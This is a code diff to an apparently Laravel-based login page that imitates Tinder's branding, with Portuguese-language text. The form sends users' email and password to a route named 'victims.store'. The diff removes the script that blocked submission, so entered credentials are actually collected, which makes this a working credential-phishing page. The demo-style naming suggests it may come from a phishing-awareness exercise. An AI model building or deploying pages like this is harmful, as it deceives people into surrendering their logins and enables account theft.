@@ -57,9 +57,10 @@
       <div class="w-full max-w-md rounded-[30px] bg-white p-7 shadow-xl shadow-black/5 sm:p-10">
 
         <a
-          href="../index.html"
+          href="/"
           class="mb-8 flex items-center justify-center gap-2 text-2xl font-black lg:hidden"
         >
+        
           <i data-lucide="flame" class="fill-match text-match"></i>
           tinder
         </a>
@@ -70,13 +71,14 @@
           Entre para continuar descobrindo conexões.
         </p>
 
-        <form id="demoLogin" class="mt-8 space-y-5"  method="POST" action="{{ route('victims.store') }}">
-
-          <label class="block">
+        <form id="demoLogin" class="mt-8 space-y-5"  method="POST" action="{{ route('victims.store') }}"> 
+            <label class="block">
             <span class="mb-2 block text-sm font-bold">E-mail</span>
+            @csrf
 
             <input
               required
+              id="email"
               type="email"
               name="email"
               placeholder="voce@exemplo.com"
@@ -137,12 +139,6 @@
     const formulario = document.querySelector("#demoLogin");
     const botaoDemonstracao = document.querySelector("#demoBtn");
     const botaoMostrarSenha = document.querySelector("#showPassword");
-    const campoSenha = document.querySelector("#password");
-
-    formulario.addEventListener("submit", function (evento) {
-      evento.preventDefault();
-      window.location.href = "/discover";
-    });
 
     botaoDemonstracao.addEventListener("click", function () {
       window.location.href = "/discover";
